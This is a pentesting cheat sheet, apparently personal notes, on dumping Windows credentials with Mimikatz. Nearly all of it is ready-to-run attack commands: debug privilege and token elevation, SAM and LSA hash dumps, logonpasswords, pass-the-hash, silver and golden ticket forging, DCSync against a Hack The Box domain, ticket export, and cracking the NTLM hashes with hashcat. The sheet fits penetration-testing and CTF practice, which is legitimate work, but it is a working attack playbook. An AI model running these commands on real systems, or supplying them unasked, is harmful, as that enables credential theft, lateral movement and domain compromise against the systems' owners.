# Dumping with Mimikatz

## Mimikatz

### NTLM Hash

Post exploitation commands must be executed from SYSTEM level privileges.

* mimikatz # privilege::debug
* mimikatz # token::whoami
* mimikatz # token::elevate
* mimikatz # lsadump::sam
* mimikatz # sekurlsa::logonpasswords

Execute Mimikatz as Administrator:

```
.\mimikatz.exe
```

Enable the SEDebugPrivilege access right required to tamper with another process:

```
privilege::debug
```

LSASS is a SYSTEM process so we need to elevate the security token from High Integrity to SYSTEM Integrity:

```
token::elevate
```

Dump the information of the SAM database:

```
lsadump::sam
```

We're interested in the NTLM hashes.

### Pass The Hash

* mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm\_hash

### Inject generated TGS key

* mimikatz # kerberos::ptt&#x20;

### Generating a Silver Ticket

AES 256 Key:

* mimikatz # kerberos::golden /domain:/sid: /aes256: /user: /service: /target:

AES 128 Key:

* mimikatz # kerberos::golden /domain:/sid: /aes128: /user: /service: /target:

NTLM:

* mimikatz # kerberos::golden /domain:/sid: /rc4: /user: /service: /target:

### Generating a Golden Ticket

AES 256 Key:

* mimikatz # kerberos::golden /domain:/sid: /aes256: /user:

AES 128 Key:

* mimikatz # kerberos::golden /domain:/sid: /aes128: /user:

NTLM:

* mimikatz # kerberos::golden /domain:/sid: /rc4: /user:

### DCSync

DCSync with mimikatz:

```bash
lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle
```

### Service Tickets

> Other hash dumping tools: `pwdump`,[`fgdump`](http://foofus.net/goons/fizzgig/fgdump/downloads.htm),[**Windows Credential Editor**](https://www.ampliasecurity.com/research/windows-credentials-editor/) (`wce`) for older versions of Windows

* ask for **SeDebugPrivilege** in order to interact with the LSASS process and processes owned by other accounts (to be executed as administrator):

```
mimikatz # privilege::debug
Privilege '20' OK
```

* elevate the security token from high integrity (administrator) to SYSTEM integrity (not needed if `mimikatz` is launched from a SYSTEM shell)

```
mimikatz # token::elevate
```

* dumping all password hashes:

```
mimikatz # lsadump::sam
```

* dumping NTLM password hashes:

```
mimikatz # lsadump::lsa /patch
```

* Cracking them with `hashcat` (or [Pass-The-Hash](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#%EF%B8%8F-post-exploitation-pivoting-and-lateral-movement) directly): `hashcat -m 1000 ntlm-hashes.txt <WORDLIST>`
* dumping the credentials of all logged-on users:

```
mimikatz # sekurlsa::logonpasswords
```

* dumping all service tickets of all logged-on users:

```
mimikatz # sekurlsa::tickets
```

* download service ticket:

```
mimikatz # kerberos::list /export
```
